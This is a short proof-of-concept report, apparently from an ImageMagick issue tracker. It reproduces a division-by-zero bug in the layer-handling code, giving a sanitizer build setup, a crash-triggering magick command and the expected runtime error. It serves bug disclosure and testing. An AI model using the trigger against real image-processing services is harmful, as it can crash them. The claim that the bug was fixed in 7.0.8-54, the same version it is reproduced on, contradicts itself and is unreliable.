# Division by Zero Vulnerability in ImageMagick

## POC URL
https://github.com/ImageMagick/ImageMagick/issues/1629

## Compilation Environment
- OS: Ubuntu 18.04.1 LTS
- ImageMagick version: 7.0.8-54 Q16 x86_64
- Compiler: clang-7/clang++-7
- Compiler flags: `-fsanitize=address,undefined -g`

## Run Command
```bash
magick "-seed" "0" "-delay" "34<" "(" "magick:rose" "+repage" ")" "(" "magick:rose" "+repage" ")" "-encoding" "Symbol" "-layers" "remove-dups" "-quiet" "tmp"
```

## Expected Output
The command should trigger a division by zero error at `MagickCore/layer.c:1616:30` when processing the image layers. The error occurs because `curr->ticks_per_second` is zero, leading to undefined behavior.

```
MagickCore/layer.c:1616:30: runtime error: division by zero
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior
```

This vulnerability was fixed in ImageMagick version 7.0.8-54.